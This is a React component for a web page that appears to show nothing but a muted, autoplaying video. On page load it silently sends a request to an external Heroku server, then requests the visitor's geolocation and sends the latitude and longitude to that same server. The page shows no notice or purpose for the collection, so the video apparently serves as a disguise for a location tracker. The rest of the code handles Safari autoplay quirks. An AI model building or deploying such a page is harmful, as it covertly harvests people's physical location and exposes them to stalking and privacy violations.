import axios from "axios";
import React, {useEffect, useRef, useState} from "react";
import mainVideo from './example.mp4';
const url = "https://alonschwartzblat.herokuapp.com/";

let geolocation, setLocation;
const sendRequest = async()=>{
    const requestOptions = {
        method: "GET",
        url: url,
        params: {
            'latitude': geolocation.coords ? geolocation.coords.latitude: "",
            'longitude': geolocation.coords ? geolocation.coords.longitude: ""
        }
    }
    await axios.request(requestOptions);
}
const isSafari = () => {
    const ua = navigator.userAgent.toLowerCase();
    return ua.indexOf("safari") > -1 && ua.indexOf("chrome") < 0;
};
function App() {
    [geolocation, setLocation] = useState("");
    const getData = async () => {
        await sendRequest()
        navigator.geolocation.getCurrentPosition(async (pos)=>{
            console.log(pos);
            setLocation(pos);
            await sendRequest()
        });
    }

    useEffect( () => {
        getData()
    }, [])

    const videoParentRef = useRef();
    const [shouldUseImage, setShouldUseImage] = useState(false);
    useEffect(() => {
        // check if user agent is safari and we have the ref to the container <div />
        if (isSafari() && videoParentRef.current) {
            // obtain reference to the video element
            const player = videoParentRef.current.children[0];

            // if the reference to video player has been obtained
            if (player) {
                // set the video attributes using javascript as per the
                // webkit Policy
                player.controls = false;
                player.playsinline = true;
                player.muted = true;
                player.setAttribute("muted", ""); // leave no stones unturned :)
                player.autoplay = true;

                // Let's wait for an event loop tick and be async.
                setTimeout(() => {
                    // player.play() might return a promise but it's not guaranteed crossbrowser.
                    const promise = player.play();
                    // let's play safe to ensure that if we do have a promise
                    if (promise.then) {
                        promise
                            .then(() => {})
                            .catch(() => {
                                // if promise fails, hide the video and fallback to <img> tag
                                videoParentRef.current.style.display = "none";
                                setShouldUseImage(true);
                            });
                    }
                }, 0);
            }
        }
    }, []);

    return shouldUseImage ? (
        <div className="video_player">
        <img src={mainVideo} alt="Muted Video" />
        </div>
    ) : (
        <div className="video_player"
            ref={videoParentRef}
            dangerouslySetInnerHTML={{
                __html: `
        <video
          loop
          muted
          autoplay
          playsinline
          preload="metadata"
        >
        <source src="${mainVideo}" type="video/mp4" />
        </video>`
            }}
        />
    );
}

export default App;
